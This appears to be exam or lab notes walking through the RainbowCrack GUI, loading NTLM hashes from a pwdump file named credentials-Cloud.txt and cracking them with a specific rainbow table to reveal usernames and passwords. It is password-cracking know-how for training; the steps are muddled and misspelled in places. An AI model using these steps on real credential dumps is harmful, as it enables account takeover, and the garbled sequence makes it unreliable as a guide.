Rainbow crack

This is the windows /ubuntu question, so we need to find the file credentialis-cloud.txt in some
windows machine.
Open the rainbow crack application by going into the Document folder and double click
rcrack_gui.exe
Click on file and select “ NTLM hashes from the pwdump file …”
Then open dialog-box appears navigate to (credentials-Cloud.txt) and open OR
Then you will go and select and open (Credentils-Cloud.txt) file on the same machine where the
rainbow crack application is. OPEN
The above-mentioned process will crack and give us the username in clear text
Now on the same rainbow crack page where we have the usernames got to the 3rd tab”
rainbow table” click and then click again on search rainbow table from the drop down
menu.
Open dialog button appears select the file from it with name mentioned in the lower
command/next command.
In the next window choose ntlm_loweralpha#4-6_0_2400x4000000_ox#000.rt and then click
open
The above-mentioned process will crack the username and password straight away in clear form.

required account no and tick the right answer
